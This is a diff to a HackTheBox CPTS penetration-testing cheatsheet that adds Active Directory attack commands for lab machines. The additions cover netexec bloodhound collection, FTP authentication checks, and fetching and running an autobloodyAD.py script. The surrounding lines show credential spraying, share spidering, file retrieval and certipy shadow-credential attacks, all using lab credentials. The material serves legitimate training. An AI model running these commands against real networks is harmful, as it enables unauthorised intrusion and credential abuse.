@@ -55,6 +55,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [bloodhound](#bloodhound)
 - [netexec](#netexec)
 - [certipy](#certipy)
+- [autobloodyAD](#autobloodyAD)
 - [bloodyAD](#bloodyAD)
 - [impacket](#impacket)
 - [useful command](#useful-command)
@@ -795,7 +796,11 @@ cargo install rusthound-ce
 
 or
 
-wget https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.5/rusthound-ce-Linux-gnu-x86_64.tar.gz 
+wget https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.5/rusthound-ce-Linux-gnu-x86_64.tar.gz
+
+or
+
+https://github.com/dirkjanm/BloodHound.py
 
 # run bloodhound to colect data   ( command download : pip3 install bloodhound ) 
 bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.10.11.69 --zip
@@ -825,6 +830,9 @@ netexec winrm  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'
 # auth with ldap  
 netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'
 
+# auth with ftp  
+netexec ftp  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'
+
 # auth with ldap by kerberoas when NTLM dissable
 netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k
 
@@ -842,7 +850,10 @@ netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares --spider IT --regex .
 
 # get file in folder share IT  
-netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --share IT --get-file 'First-Line Support\\a.xlsx' a.xlsx 
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --share IT --get-file 'First-Line Support\\a.xlsx' a.xlsx
+
+# run bloodhound  by netexec 
+netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --bloodhound --dns-server 10.10.11.42 --collection all
 
 # try auth with user and pass in 2 file ( no  bruteforce ) 
 netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --no-bruteforce --continue-on-success
@@ -887,6 +898,17 @@ certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
 certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
 or
 certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc -dc-ip 10.129.6.201 -scheme ldap
+
+```
+## autobloodyAD
+
+```
+# download file autobloodyAD.py   (  https://github.com/lineeralgebra/autobloodyAD )
+wget https://raw.githubusercontent.com/lineeralgebra/autobloodyAD/refs/heads/main/autobloodyAD.py 
+
+# run autobloodyAD.py 
+python3 autobloodyAD.py 
+
 
 ```
 ## bloodyAD
@@ -1025,6 +1047,8 @@ scp * svc_backup@dc.voleur.htb:/mnt/c/IT/
 # command smbclient to connect folder shares by auth kerberoas
 smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT
 
+# run bloodhound  by netexec 
+netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --bloodhound --dns-server 10.10.11.42 --collection all
 
 ```
 ## Useful Resources 
